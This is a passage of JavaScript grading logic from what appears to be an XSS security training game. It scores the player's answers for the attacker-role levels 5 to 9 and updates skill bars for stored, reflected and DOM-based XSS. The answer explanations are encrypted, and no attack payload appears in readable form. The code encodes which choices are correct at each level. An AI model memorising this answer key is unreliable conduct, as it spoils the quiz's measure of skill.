        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18+s5rjoLuIO4rRwDyfz+5+vR8IHj7y0Jz1EmS/HDGsIpxUrhThRXHXKRRuoylQCjTffVgfP1nZGxLnPkopWmsRf43Tw8qHsBelTAsL8/bD39PHk22yDC72ulXTuc/J6GqphbAZYYcg1RFNY04GzRFJrQI0opuPLIVmiZMhl10/Ls5m44wP5nVA5Hlj/cQZlKF7vWfCiH8GlDI/DJz5+sjwBP1LBNQ0ErOczzl59kGAWip1eKSUJljsi393ENGTgZfHtDmgeLrTr1F8xIDBBbZsNxE/Kmg5QM6z8rm0y4ebchbiwCmdRJRnleVB2uSs2gU7JsX4vrVVkR4chsaTxXaZVxFrzBXkB0C1CuN7XH5G8DeC8u4j+C4IRMLwOv2upVEEZUaZwkpXM3JZt/SC+cYfKzpoovq9KFIzaJEWeyAs/gWhF4TfZ+albPmJluXETUJrVJcpmCs/LFykx3dHFaUxq9dP7+oXTNSBTgp42QHwyjhIE2cGOjddoZuLQVtFKq6+XBRggxg2w8CIuQ71ivsqvqOyiDZX4LZPznx4G4urmK6cpkOQHIlSpbZU64EiiGAoXywJJ5LJMGwZ4srGx35eqec9IIBzwmoVY84cwv0ggS8qZH8+PqwGbGFtA+yCPrDhjqYGzBjdv5MfanDuUBkWj9W7Aim058BCIr/ZC4BLesPAY4xae6DaXeMC/4V6Uck6OE0mUvvpFjAiSDj686rZGEufJG+Mlao=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19EoQT/ul9OKLsvUjj4NUW1PalI7TW1af9hbQ+MRxzT+TiMxx7Xcnej", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+bVf2UWnE8ShlkVeOljXJNPm6FInxQ50HRJOOCMBGxYQ2t5xVI8V3XllQxSDI6dSZSfxxQ+h8OZSWwQqvfa3XATKnPmscH71q6/a0+wC9uykPveaet9/hv", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:5");
        currentLevelNo = 6;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;
            correctAttackerAnswersList.push("R0L5Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;
            correctAttackerAnswersList.push("R0L5Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }


        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;
            correctAttackerAnswersList.push("R0L5Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectAttackerAnswersList.push("R0L5Q1A4");


            AttackerStoredSkillsValue = AttackerStoredSkillsValue - 2;


            if (AttackerStoredSkillsValue < 0) {
                AttackerStoredSkillsValue = 0;
            }


            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;



            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }



            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L5");
    } else if (roleId == 0 && currentLevelNo == 6) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+aIjvGK9TH20akw6F1vgLyip+Ifd5Ib3ayQjEs+ivJ1sBAns2cTjW3", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+sHD5rk9BFDeOSJ3BVhMuZSSm+dN1+eqcr9Q+hFQF8U84zJ9mvQMMSOPZKRlEn8S9mO8vcWAin59yjpdOzCMLSyBKYywnx4WdHE6/P3p6OvrMSdYiPaP/idDvE1g+Qkflk6l8ioDkWOeb6dQQ6L0q9jtoivTdJnB3dg60sFDCoMMvhiL/684xL80i2cq45oViYWJI600GT7KSAqFphtGkCtBB1Ot/GdBjoIcjE+jWCWtqxl0XWfe3RcS6qT69NrVy3iSXXgOOT9I0roNdw9uD/b1610rxKHYvWmPUR5GlgnjB9Df7zcbq6CuFHQSroOhKh4eV5TXsDRFHpQQ1vajU+tLaNvgzPOCIfpsnMtR67uFlnCkHFkABfVHlnVnSS+7aUCZ3w3+evNsfK5QvavicciT+npCuRUocxJiR+wGmfx/+VuFwFA1LZI8HdYuEZxSfE0uILw5tPkTzgLHkT+ggWYWWv94FUdVQl4nl8eXCatUxvgNaeI+x2OzgUJ0H5PRg8ckk/9OsTeWJ+IV9pdlI6MDQXY4v3sK0=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX182FXdooJS7fmnet83oyMGoSfO4qY+NhuEde+5nFGv9aNe8AB6kPDun", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[1]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19P/CuAYSu6ig8nBhb6htnc+QEWvfMyZFvNfFPIxj4pF292FJ7m4qGR5atFM+GWz05XCUz0ArVEjysgE43xSfOX63kYq6pEqBrKUsuyGzWlkykBDdAWb2zlmztkhPz+zKFDj3JWyk3CUc1uP14sdFTHPh/n7xeP8MO9fjylF+9PP3MJZi35k8uUKoHfcRlxfh2KWofP6v9bjqgneyQk0IvY3VZDZZ/UWZJ01VSrcjcwDIaRKEJ04X+jH0egyRPpKOZISc2w2NAACrIw64mSF7omTGk6GvfG6Edt8HNFQgN9j29NXZlSNLgeYfggve2hvRGS28apwmkMxTaeopigz/p3YTVfXP3cs84YYCcXY0jA8vtP2q0PPJp+p65/iO6xTHp6wnTBrrv1Ug==", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:6");
        currentLevelNo = 7;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;

            correctAttackerAnswersList.push("R0L6Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctAttackerAnswersList.push("R0L6Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }


        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectAttackerAnswersList.push("R0L6Q1A2");


            AttackerStoredSkillsValue = AttackerStoredSkillsValue - 2;


            if (AttackerStoredSkillsValue < 0) {
                AttackerStoredSkillsValue = 0;
            }



            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;




            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }



            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectAttackerAnswersList.push("R0L6Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L6");

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;



    } else if (roleId == 0 && currentLevelNo == 7) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18+ZZgzWzplVCvItVOITRQrSWj0H0qvCc0WZJKzVVYEFqbPlLmMQYzR", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18v4Nz0POxR2xDQm9sJKfguPQ8UDB9P7ULY3023ZYBvUzVQV4LeutHo4eCouNsOCDSQ+FfX8aSW6RL2I8qSG0ySHEINok1W8vSZH0gHGoz7szVYyfJNz3PvQJf7KpTcM628UD6mmugY+9b7FVgrtBxzzRZ4ms4VsPq3ScSg13KWSNcVjtnoDRpHk3J7mBi2JPqnv7AMKAPRaIPWK1sQC3DwGhE1Gj620KvmV12v7jCAXZ4oeXeEI/EcMaBoyFoTFehy9eqoaZLe43C2+NBn+5Fd8AkBkG8lvuhm7KvwLsb4ASUioyWWIM5t3q/j2k0XlHt60G+whLdBnlUU1MnBM4OVs7GqcQpjlLhuNDckxsuq+qW/qNY7+lQpzubd7DWdo4duD5haAGR10TZMoHaA10WpUEG34x8O/bskI3F1nu+NeDn6hqWkJVYlnlI0BTIAiUNN4W1HkC22NXmEYz5a5UV7Q9VVXKi6FgOvLwqh43yJDbcImna/2PvaZc+A/FeD0bmchsErROPSQp7Yb0q+e3iT4W3mtrgetWBQqDqf4KXHdJXKHKFdZSRdhbRoXYbYxFkwJhLQ8i52Xtwb4pwijAB2XncWW/pL+HCiqe2VHVO/vAQt1WgR8KRzw8Zf+MngHs9dTTrRBPVJ3H15J9chgi96kyYZAPM9mRzHs/Co8Qaeecesq9BAoLfzf2fVBitWR1nE8W4scL4JVSIHuMB5VJ1wgn5ksbOwd/1sdyO5umwe8I5EZt0IgDB1ZEC0/1rmfglEsgUef0ZK7mQ9zcUR9FH9pSo8aGjQ6LX92yb6xho+eVGH5/oBaMZkvNHYqdik1D6bMXhWtY8fgUm1MMQD9zlOXFrBQWKv3CBYR5SowlcWwtKbL/CkxCgl", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19HL7FFXb8NjukX+mFFxRz/6ADhqBJFfguqvQKviwnUuACQSGNKfctk", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/RP/Euy4Dmh503p5ECFeBvsY4T36O9Ym7UrdFh1a9W+S/Oed3kifrrI9w86DVxW11blX3JrHUL46XwKdUgH4Mi5MPk+8bTRiq3Hw5nXu9/TKck8EjCPP2IZQUF7NyRskuCYCFpQrTW24igeTmH6Iu+h0R39U06mcmz84MikN/2OIQuYP8mzwDrDlR3qqd2YB9G7VdxGVJAkddT/1ofPqy3h3vCvlUS6QXb7upuvkQYf6E43MZYi9Y5Gzj+Iz4xOsSM6mfX0RSO5xg/T+tOxquy1XssqnJ08aR536mO8W1nYdw9YyRjNEstQHUVVIr62lB6FJJYY/T8SftV37r2gbfh/IvCrF8ElWZ9ubkqUmg1fuJEJqpTk9dqVFcyveXEjHU+6BmcQlEFr5P0BX6V5TDzhuwZsQbwloU=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:7");
        currentLevelNo = 8;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L7Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L7Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }


        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L7Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectAttackerAnswersList.push("R0L7Q1A4");

            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue - 2;

            if (AttackerReflectedSkillsValue < 0) {
                AttackerReflectedSkillsValue = 0;
            }

            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;


            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }


            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;

        }

        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);

        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        levelsCompleted.push("R0L7");


    } else if (roleId == 0 && currentLevelNo == 8) {

        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19ovw4Ubk6uZ/3eLzZqoHXhmxdGQ/m+KPsdnePrwnoWmjA7+JH20uK/", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19QM2/NbeHs2c1k0AI3ZcRntEtjmDmGl07q2hWwKJmeIW/Xjl79aHCsaTJY3ZbF9mE6nOcRJWgj+GuNDiYOIywdmpZ4Zrw3RbeGe1J4EX0DKYjVBDCX/UvXSsG0GhVYDg13T8UR7TMJjJ3raYdbM69r2uhRDCPqSW8CiUWobwRqVOuFRweIsjXmgfnR83YzefL5eFjIGoiMMVhJ5HHWY7YR70S8dt/FTEqW/lTsyCWh3VHbFWd5annsAZkTiOj5R1k9f8hx0UU1WXutDsQKOu3R2YDUdlZniuOBOPzyn2kglMclnv+faDKvngudiLwfAmESzR89JblST6kOe2cIg3+eJirdr0dckIX8cMK8cD7ouLuOjP2S8wnOE0BhGnNYd9tEpoIS9ZUQTYcsAaZTwVE+w5CWAUa7MlEjGQCH1uzwM9Yi3f6zYzMfUXuqyJCM6TCvzaCUkGQCX2+lau8W2E9SQBbR/hPHOVXETaRDGe1a5HNbYvr92tCdL6vBwozrzsDppOb70AAaljWpZccEHa1zLA8QFc/xjO0IYwEjcLwcN7NV5z+u/XP+tR52iVTjCAOCSYLytUWk1opUHnWpozvIwGPRBgz1XwqDuVuOSaNpIin52wjKacS1CM67dCLXIdnWTMfqEGKg6z9cx35yDMMKSmLXDfhrm8w8kVbbkuaZJc0wrRuaRaP40fl/+hljtQywt79eo4VbtKKvjk25zpS/V9fkGtrzCf7XngjSwabPuWvs3J76z9jvB0HfP17mFyfJRhkXXqYCRbRc8oQqxYJrEMN8WRYkDGK+SEVeIv40sgAy3S6hRRQmvSlQhVLIeCE9q4+v1HnfDCvIY5J3Kgf+Edj6Ve/Td0B6mVAI1x/VX8PK24tM8i6WrROhf+O1vDlVrX7Uxo65WaK/2ZhMFrzr2e4oAwTsqrw=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/Kl+/DPXdCGB26LCXrwvYLpjLJZ3Qy76Kdr2LRFxDKPAQ1ow0PIcfV", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/RWoaaZBdLKNW3SonxjDdRnCsNLQHtY+m5TRdlrbH95cgd7zVMlX58kXW6c147Jldn6h2/3bgJKT3/FoNG5I8B+vm5o7QJwK/ozQLsMIXXG0GzchY3pxz3sq2K51BwAHZ5AQ9Wu1pg5Y9amT50Mb7v/ATLz7VB2RXG8SnalJxAfS1hTjoDGv+s", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:8");
        currentLevelNo = 9;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L8Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            incorrectAttackerAnswersList.push("R0L8Q1A3");

            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue - 2;

            if (AttackerDOMBasedSkillsValue < 0) {
                AttackerDOMBasedSkillsValue = 0;
            }


            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;




            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }


        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L8Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctAttackerAnswersList.push("R0L8Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }



        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;

        }

        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        levelsCompleted.push("R0L8");

    } else if (roleId == 0 && currentLevelNo == 9) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX184IjWMbDq+3Yhq/EA/d+0DpV6OXCu9aZI8HNXgSW/t638NzyCM5w4R", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/QelEsQIkCEvGhc8MurAra0mTdSqW8Cqi9UvUHxJjHg+krckeRtvObIK5VvX/tIO8fUxGEzl02NTYI7Qj+3GSJA9e2bsmqO7Kg6kA5M4h5VqWNE06JR9KFx3+5EMhTnpS9BP57BJA51D786Nj5lrFG1OO6KQnEGYEmguaEr3yBqChgR6BHr8RnC0nHK31k2i40FGy2DXLwcrwSiwAKhYM/pWfV77n5ET8qLQ4fytu5CfjvsaQtniYW0sKEEXbacRZdkVAH0jMk+ksi5BMJ6ASGMY/UW9GVxPks/EVUHre+E2T1x69uieuHRaNFAq3fpHE7EEaGzC245sC/Y/6f0rzxVn4oJZB+dlzKsz9tmM9sYfUs8/hdUBUvfpt4BTnZ/AEPWxx8jbGO7z+fsZ+ZMwLSSf3OQryJ0hhtso4BxZwxWBC1agbWgt036wcx5WMC2EaxaEaBftTOBFHpx99w1Uk/7drd0BOo0F8z+eYm+igYENNoT1PlwXnFxLZsYbBvsIvwVIFx/WwoH9PaMYpc9YYsdtGwpTH4EASV4kR+I5YiD3aVFQmvpatqPX5iopZKtjzC5ulINakIm2stz09FvWrisJHf/YPu8NCMCCm7mcaoqRBPkdn6DEN2h6uMmHtXBe7H6Ad+T0un8jnIZQhtlSHxoQZnOxe9BzPvA53x+KzewyuF3jwoLsr78cwGJFspkEf+XDaaVsswbjYd8D8e+APMu2qlimcZXsTAlLSWqpyeBh0hftNQeiG5", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+a9X98Tcz+7xTtyHisxRobN+y8NkrqyfbkdySR3ZOaUN4Je9CTRAlm", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+XnivtTOQVYqT8iVuA0Hry1HzmVLMSwS8/Wujy3w92rPbj5VZhxEb7/3odI4ppvfyQGBSBXFaxAuQItyUIVY7SvqY201etWqGPWzVY1kjbzHFnHzkU+iJTFKqjeK7s3FAlxpPTvCpGjm+5qqsKho71aT6VC7klNsAuk3nglGZ3yEH0mEE01N1uk0DnyJJ2aK3sBzgqA5ysw0mfBcnIHk/FlX9jqhGhMWATSW5wYFh1FBsJKdjBCvC0/2cX6oHY+iyfEMwijrIS+RrYDefSFbKMedg89C+xkQGPUi1+zGE0Rc4TTXNdYU530lrNWaYml+585L+vzMBAj+RkFYl4egm9X/E6hYRLSztRiVs6ICq3O1HX7V2XwWu0TTOJfpnZfOtpM0BgzsmGKJ+ChrEs2V2XWPm8tOGuhvOFBDMI0QXIs3JnQXPw+JhRUaviBRZQew8lXiObs4yMTawytZQjNnlCkmJprL4TMghc9b9i/d5/To8xVInilu0fUPa1LpoxFMNkszaWeqb3N0vBYuXE+mGxp0EzehEw8WbTmKkIUHD5fO1meT+Rc11Z3j+qZVi6HbhNgOl4ZSqeMEBtJjSYlfPatnYHGqrEcDV6gigwClDQumQgAaC65mxgCNfKbCdQzrF5RzaGWwuzfqF23r86+PwaqlV2TqWpHqaBUvYBEBlw4JpYLSocl7IAy3z2YXMmP56MA2ODUQ1LA03/nSFt6D3LAvGimODhgjU=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:9");
        currentLevelNo = 100;
        clearInterval(timerInterval);

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectAttackerAnswersList.push("R0L9Q1A1");

            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue - 2;

            if (AttackerDOMBasedSkillsValue < 0) {
                AttackerDOMBasedSkillsValue = 0;
            }



            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;




            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }

        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;


            correctAttackerAnswersList.push("R0L9Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }


        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectAttackerAnswersList.push("R0L9Q1A2");

            AttackerStoredSkillsValue = AttackerStoredSkillsValue - 2;

            if (AttackerStoredSkillsValue < 0) {
                AttackerStoredSkillsValue = 0;
            }



            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;




            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }



            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            AttackerDOMBasedSkillsValue = AttackerDOMBasedSkillsValue + attackerDOMOffset;
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctAttackerAnswersList.push("R0L9Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;

        }

        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

